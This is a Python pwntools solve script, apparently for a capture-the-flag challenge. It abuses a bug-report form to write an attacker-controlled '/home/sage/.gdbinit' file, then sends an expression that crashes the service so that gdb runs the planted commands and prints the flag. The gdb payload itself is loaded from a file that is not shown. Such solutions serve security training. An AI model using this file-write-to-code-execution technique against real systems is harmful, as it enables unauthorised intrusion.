#!/usr/bin/env python3
import os
import sys, re, time
from pwn import *
context.log_level = 'error'

def solve(host, port, token=None):
    r = remote(host, port)
    if token:
        r.recvuntil(b"access token:")
        r.send(token.encode() + b"\n")
    r.recvuntil(b"> ", timeout=60)  # sage startup

    payload = open(os.path.join(os.path.dirname(__file__), "gdbinit_payload.txt"), "rb").read()

    # 1) plant .gdbinit
    r.sendline(b"2")
    r.recvuntil(b"bug name: ", timeout=15)
    r.sendline(b"/home/sage/.gdbinit")
    r.recvuntil(b"description: ", timeout=15)
    r.sendline(payload)
    r.recvuntil(b"> ", timeout=15)

    # 2) trigger crash in a NEW connection (chall.py exits after this branch anyway)
    r.close()

    r2 = remote(host, port)
    if token:
        r2.recvuntil(b"access token:")
        r2.send(token.encode() + b"\n")
    r2.recvuntil(b"> ", timeout=60)
    r2.sendline(b"1")
    r2.recvuntil(b"p:", timeout=15)
    r2.sendline(b"17")
    r2.recvuntil(b"expression :", timeout=15)
    r2.sendline(b"x-x+y-y+3")

    out = r2.recvall(timeout=25)
    m = re.search(rb"FLAG_OUTPUT\[(.*?)\]", out, re.S)
    if m:
        print("FLAG:", m.group(1).decode(errors="replace"))
    else:
        print("No flag found. Output tail:")
        print(out[-2000:].decode(errors="replace"))
    r2.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    token = sys.argv[3] if len(sys.argv) > 3 else None
    solve(host, port, token)
